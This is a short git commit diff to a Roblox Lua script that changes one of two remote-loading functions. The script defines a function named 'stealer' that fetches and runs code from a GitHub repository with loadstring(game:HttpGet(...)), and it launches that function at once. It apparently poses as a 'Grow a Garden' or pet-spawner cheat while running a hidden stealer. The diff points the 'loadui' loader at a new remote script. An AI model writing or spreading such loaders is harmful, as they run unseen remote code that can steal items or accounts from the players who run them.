999a9f263341e98d74191f619227f9680befe263
ScriptLast <hadikusumah012@gmail.com>
2025-05-28 15:26:00 +0700

    Update Script1.lua

--- Script1.lua
+++ Script1.lua
@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script.lua'))()
 end
 local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner1/refs/heads/main/script1.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script2.lua'))()
 end
 
 task.spawn(stealer)
